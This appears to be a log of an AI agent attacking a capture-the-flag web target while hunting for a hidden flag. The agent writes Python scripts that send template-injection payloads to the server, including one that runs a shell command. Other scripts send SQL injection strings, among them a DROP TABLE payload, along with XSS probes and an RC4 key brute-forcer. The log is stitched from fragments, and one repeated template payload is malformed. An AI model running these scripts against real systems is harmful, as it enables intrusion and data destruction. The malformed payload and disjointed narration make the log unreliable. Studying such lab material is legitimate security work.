- **SSTI (Server-Side Template Injection)**: This suggests that there may be an opportunity to inject and execute server-side templates. This type of injection can often lead to remote code execution or access to sensitive data.

### 3. INFORMATION TO BE INVESTIGATED
- **Target URL Analysis**:

### 4. RELEVANT KNOWLEDGE AND EXPERIENCE
- **RC4 Encryption**:
  - RC4 is a stream cipher known for its simplicity and speed but also known vulnerabilities. Understanding how to encrypt and decrypt using RC4 will be useful.
- **SSTI Knowledge**:

- **Web Application Penetration Testing**:

**********要执行的代码**********
Let's automate the process of injecting common SSTI payloads into the webpage to check for server-side code execution. We'll use Python with the `requests` library to send the payload and check the result.

Here is the Python code to perform this task:

```python
import requests

# Target URL
url = "http://47.251.44.45:40623"

# Common SSTI payload
payload = "{{ 7*7 }}"

# Injecting the payload
response = requests.get(url, params={'input': payload})

# Check if the server-side execution happened by inspecting the response
if '49' in response.text:
    print("SSTI vulnerability detected!")
else:
    print("No SSTI vulnerability detected.")
    
print("Response content:")
print(response.text)
```

This code sends a GET request to the target URL with an SSTI payload and checks whether the execution result ('49') appears in the response content. Let's run it and observe the outcomes.

```python
import requests

# Target URL
url = "http://47.251.44.45:40623"

# Advanced SSTI payloads
payloads = ["{{ '__'.class__.__mro__[1].__subclasses__() }}", "{{ 7*7 }}"]

for payload in payloads:
    # Injecting the payload
    response = requests.get(url, params={'input': payload})
    
    print(f"Testing payload: {payload}")
    print("Response content:")
    print(response.text)
    print("-" * 50)
    
    # Check for known result formats or evidence of payload execution
    if '{{' not in response.text and '49' in response.text:
        print("Possible SSTI vulnerability detected with payload:", payload)
        break
```

This script includes both simple and slightly more complex SSTI payloads. Let's execute this code and check the responses for any distinctive behavioral changes or signs of server-side execution.

## Reflection and Conclusions

### History Recap:
1. **Initial Steps**:
   - We started by performing reconnaissance and fetching the initial web page content from the URL `http://47.251.44.45:40623`.
   - The content returned was minimal: "Welcome To Find Secret", with server details indicating the use of Werkzeug/Flask with Python 2.7.

2. **Analyzing SSTI Vulnerability**:

   - We then tested more advanced SSTI payloads (`{{ '__'.class__.__mro__[1].__subclasses__() }}` and `{{ 7*7 }}`) but there were no signs of server-side execution in the responses.

### Analysis:
- The initial attempts at exploiting SSTI vulnerabilities did not reveal any successful execution of the payloads. The responses were consistent and did not reflect the expected results of SSTI execution.

### Conclusion:
- **SSTI Vulnerability**: Based on the current tests and results, it appears that the input field or method we are trying to exploit may not be vulnerable to SSTI. It is also possible that the payloads are not reaching the intended vulnerable code path.

### Automated Probing Script

```python
import requests

# Target URL
url = "http://47.251.44.45:40623"

# List of fields to test for injection
fields = ['input', 'name', 'user', 'search']  # potential input fields that could be reflected in wigdet of the URL or form

# List of payloads to test for SSTI
payloads = ["{{ 7*7 }}", "{{ '__'.class__.__mro__[1].__subclasses__() }}",
            "{{ config.items() }}", "{{ request.cookies.items() }}", 
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}"]

def test_payloads(field, payloads):
    for payload in payloads:
        # Create the parameter dictionary for the GET request
        params = {field: payload}

        response = requests.get(url, params=params)

        # Check if any common indicators of SSTI execution are present
        if "{{" not in response.text and "49" in response.text:
            print(f"SSTI vulnerability detected! Field: {field}, Payload: {payload}")
            print("Response content:")
            print(response.text)
            return True

    return False

# Test all fields with all payloads
for field in fields:
    print(f"Testing field: {field}")
    if test_payloads(field, payloads):
        break
```

### Extended Probing Script

```python
import requests

# Target URL
url = "http://47.251.44.45:40623"

# List of fields to test
fields = ['input', 'name', 'user', 'search', 'query', 'id']

# List of payloads to test
payloads = ["{{ 7*7 }}", "{{ '__'.class__.__mro__[1].__subclasses__() }}",
            "{{ config.items() }}", "{{ request.cookies.items() }}", 
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}"]

# Additional paths to examine beyond the root endpoint
paths = ['', '/search', '/user', '/submit']

def test_payloads(field, payloads, url):
    for payload in payloads:
        # Create the parameter dictionary for the GET request
        params = {field: payload}

        response = requests.get(url, params=params)

        # Check for common indicators of SSTI execution
        if "{{" not in response.text and "49" in response.text:
            print(f"SSTI vulnerability detected! Field: {field}, Payload: {payload} at URL: {url}")
            print("Response content:")
            print(response.text)
            return True
    return False

# Test all fields with all payloads across multiple paths
for path in paths:
    full_url = url + path
    print(f"Testing URL path: {full_url}")
    for field in fields:
        print(f"Testing field: {field}")
        if test_payloads(field, payloads, full_url):
            break
```

This extended script tests multiple URL paths along with different fields and payloads.

Let's start with a script to test for SQL Injection vulnerabilities:

### Automated SQL Injection Testing Script

```python
import requests

# Target URL
url = "http://47.251.44.45:40623"

# List of fields to test for SQL Injection
sql_fields = ['input', 'name', 'user', 'search', 'query', 'id']

# Common SQL injection payloads
sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users; --", "\" --", "\" OR \"a\"=\"a", "1; SELECT * FROM users"]

# List of additional paths to examine for SQLi beyond root endpoint
sql_paths = ['', '/search', '/user', '/submit']

def test_sql_payloads(field, sql_payloads, url):
    for payload in sql_payloads:
        # Create the parameter dictionary for the GET request
        params = {field: payload}

        response = requests.get(url, params=params)
        
        # Look for signs of SQL errors indicative of SQLi vulnerability
        common_sql_errors = ["syntax error", "sql", "mysql", "sql error", "near", "unexpected"]
        if any(error.lower() in response.text.lower() for error in common_sql_errors):
            print(f"Possible SQL Injection vulnerability detected! Field: {field}, Payload: {payload}, URL: {url}")
            print("Response content:")
            print(response.text)
            return True
    return False

# Test all fields with all payloads across multiple paths
for path in sql_paths:
    full_url = url + path
    print(f"Testing URL path for SQLi: {full_url}")
    for field in sql_fields:
        print(f"Testing field for SQLi: {field}")
        if test_sql_payloads(field, sql_payloads, full_url):
            break
```

This script tests for SQL Injection vulnerabilities across multiple URL paths and fields with various SQL payloads.

### Example for XSS Testing:
Here’s an automated script to test for XSS vulnerabilities:

```python
import requests

# Target URL
url = "http://47.251.44.45:40623"

# List of fields to test for XSS
xss_fields = ['input', 'name', 'user', 'search', 'query', 'id']

# Common XSS payloads
xss_payloads = ["<script>alert('XSS');</script>", "<img src=x onerror=alert('XSS')>"]

# List of additional paths to examine for XSS beyond root endpoint
xss_paths = ['', '/search', '/user', '/submit']

def test_xss_payloads(field, xss_payloads, url):
    for payload in xss_payloads:
        # Create the parameter dictionary for the GET request
        params = {field: payload}

        response = requests.get(url, params=params)
        
        # Check for inclusion of XSS payload in the response
        if payload in response.text:
            print(f"Possible XSS vulnerability detected! Field: {field}, Payload: {payload}, URL: {url}")
            print("Response content:")
            print(response.text)
            return True
    return False

# Test all fields with all payloads across multiple paths
for path in xss_paths:
    full_url = url + path
    print(f"Testing URL path for XSS: {full_url}")
    for field in xss_fields:
        print(f"Testing field for XSS: {field}")
        if test_xss_payloads(field, xss_payloads, full_url):
            break
```

To decrypt any data that appears to be encrypted using RC4, we first need to identify such data by intercepting communication between the client and server. This can be done using tools like Burp Suite to capture and inspect traffic for any patterns that suggest encrypted data.

### Steps to Identify and Decrypt RC4 Encrypted Data:

1. **Intercept Traffic**:
   - Use Burp Suite to intercept traffic between the client and `http://47.251.44.45:40623`.
   - Look for any patterns or encrypted strings that might indicate the use of RC4 encryption.

2. **Decrypt Using RC4**:
   - Once potential encrypted data is identified, attempt to decrypt it using an RC4 decryption script in Python.
   - Assume we have the RC4 key (for this example, the key will be `my_secret_key` but you might need to derive this from contextual data or hints).

Here is the Python code for RC4 decryption:

### RC4 Decryption Script

```python
from itertools import cycle

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = []
    
    # KSA Phase
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]  # swap
    
    # PRGA Phase
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # swap
        K = S[(S[i] + S[j]) % 256]
        out.append(chr(ord(char) ^ K))

    return ''.join(out)


# Sample encrypted data and key (these need to be replaced with actual captured data)
encrypted_data = "sample_encrypted_data_here"
key = "my_secret_key"

# Decrypt the data
decrypted_data = rc4(key, encrypted_data)
print(f"Decrypted data: {decrypted_data}")
```

### Execution Steps:

1. **Use Burp Suite** to capture any encrypted data. Inspect the traffic for any strings that might appear encrypted (unusual patterns, high entropy).
2. **Identify Key**: Identify or deduce the key used for RC4 encryption from context, hints, or trial and error.
3. **Decrypt Data**: Use the provided RC4 decryption script with the captured encrypted data and key.

Please proceed by capturing traffic through Burp Suite, identifying any encrypted data, and attempting to decrypt it using the RC4 decryption code. Report any findings or decrypted information.

### Updated RC4 Decryption Script for Multiple Key Testing

```python
from itertools import cycle

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = []
    
    # KSA Phase
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]  # swap
    
    # PRGA Phase
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # swap
        K = S[(S[i] + S[j]) % 256]
        out.append(chr(ord(char) ^ K))

    return ''.join(out)


# Sample encrypted data (this needs to be replaced with actual captured data)
encrypted_data = ":ëÆ4Q*Dx×kVÎi{ó¤ôâáÚQs"  # This is from previous output

# List of potential keys (this needs to be deduced or predicted)
potential_keys = ["my_secret_key", "another_possible_key", "ctf_known_key"]

for key in potential_keys:
    decrypted_data = rc4(key, encrypted_data)
    print(f"Using key: {key}")
    print(f"Decrypted data: {decrypted_data}")
    print("-" * 50)
```

### Extended RC4 Decryption Script with Pattern Search

```python
from itertools import permutations

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = []
    
    # KSA Phase
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]  # swap
    
    # PRGA Phase
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # swap
        K = S[(S[i] + S[j]) % 256]
        out.append(chr(ord(char) ^ K))

    return ''.join(out)


# Sample encrypted data (replace with actual captured data)
encrypted_data = ":ëÆ4Q*Dx×kVÎi{ó¤ôâáÚQs"  # This is from previous output

# Function to generate key patterns (you can customize with more patterns)
def generate_potential_keys():
    keys = []
    base_keywords = ['key', 'ctf', 'flag', 'secret']
    num_attempts = 1000  # customize the range based on context

    # Generate simple numeric keys
    for i in range(num_attempts):
        keys.append(str(i))
    
    # Generate base keyword permutations
    for keyword in base_keywords:
        keys.append(keyword)
        for i in range(0, 1000):
            keys.append(f"{keyword}_{i}")
        for key in permutations(keyword):
            keys.append(''.join(key))

    return keys

# List of potential keys
potential_keys = generate_potential_keys()

# Test all potential keys
for key in potential_keys:
    decrypted_data = rc4(key, encrypted_data)
    print(f"Using key: {key}")
    print(f"Decrypted data: {decrypted_data}")
    print("-" * 50)
```

### Steps to Execute:

1. **Run the extended decryption script** to test a wider range of potential key patterns.
2. **Inspect Traffic** for any clues that can narrow down the key space, such as hints in headers, cookies, or responses.
3. **Look for Valid Decryption**: Identify readable and meaningful plaintext from decrypted output.

By expanding the key space search, we enhance the chances of correctly decrypting the RC4-encrypted data, leading us closer to uncovering the flag.
